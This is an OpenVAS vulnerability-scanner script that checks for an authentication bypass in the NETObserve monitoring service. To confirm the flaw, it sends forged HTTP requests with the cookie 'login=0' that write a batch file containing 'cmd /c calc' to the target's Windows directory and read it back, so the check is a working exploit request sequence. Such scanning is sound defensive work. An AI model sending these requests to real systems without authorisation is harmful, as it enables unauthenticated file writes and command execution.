# OpenVAS Vulnerability Test
# $Id: netobserve_command_execution.nasl 17 2013-10-27 14:01:43Z jan $
# Description: NETObserve Authentication Bypass vulnerability
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2003 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "NETObserve is a solution for monitoring an otherwise unattended computer.

The product is considered as being highly insecure, as it allows the 
execution of arbitrary commands, editing and viewing of abitrary files, 
without any kind of authentication.

An attacker may use this software to gain the control on this system.";

tag_solution = "Disable this service";

# From: Peter Winter-Smith [peter4020@hotmail.com]
# Subject: NetObserve Security Bypass Vulnerability
# Date: Tuesday 30/12/2003 01:30

if(description)
{
  script_id(11971);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(9319);
  script_tag(name:"cvss_base", value:"7.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"High");
  name = "NETObserve Authentication Bypass vulnerability";
  script_name(name);
 
  desc = "
  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;

  script_description(desc);
 
  summary = "Detect NETObserve Security Bypass";
  script_summary(summary);
 
  script_category(ACT_GATHER_INFO);
 
  script_copyright("This script is Copyright (C) 2003 Noam Rathaus");

  family = "Gain a shell remotely";
  script_family(family);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

debug = 0;

port = get_http_port(default:80);


quote = raw_string(0x22);

# it is better to use http_post, but I need a special refer, and cookie content

req = string("POST /sendeditfile HTTP/1.1\r\nAccept: */*\r\nReferer: http://", get_host_name(), ":", port, "/editfile=?C:\\WINNT\\win.bat?\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: ", get_host_name(), ":", port, "\r\nConnection: close\r\nContent-Length: 25\r\nCookie: login=0\r\n\r\nnewfiledata=cmd+%2Fc+calc");
if (debug)
{
 display("req: ", req, "\n");
}

res = http_keepalive_send_recv(port:port, data:req);
if (debug)
{
 display("res: ", res, "\n");
}

if ( res == NULL ) exit(0);
find = string(" 200 OK");
find2 = string("NETObserve");
if (debug)
{
 display("find: ", find, "\n");
 display("find2: ", find2, "\n");
}

if (find >< res  && find2 >< res)
{
 if (debug)
 {
  display("----------------\n");
  display("Stage 1 complete\n");
 }

 req = string("GET /file/C%3A%5CWINNT%5Cwin.bat HTTP/1.1\r\nAccept: */*\r\nReferer: http://", get_host_name(), ":", port, "/getfile=?C:\\WINNT\\win.bat?\r\nHost: ", get_host_name(), ":", port, "\r\nConnection: close\r\nCookie: login=0\r\n\r\n");

 if (debug)
 {
  display("req: ", req, "\n");
 }
 

 res = http_keepalive_send_recv(port:port, data:req);
 if (debug)
 {
  display("res: ", res, "\n");
 }

 if ( res == NULL ) exit(0);
 find = string(" 200 OK");
 find2 = string("cmd /c calc");

 if (find >< res && find2 >< res)
 {
  security_hole(port);
  exit(0);
 }
}

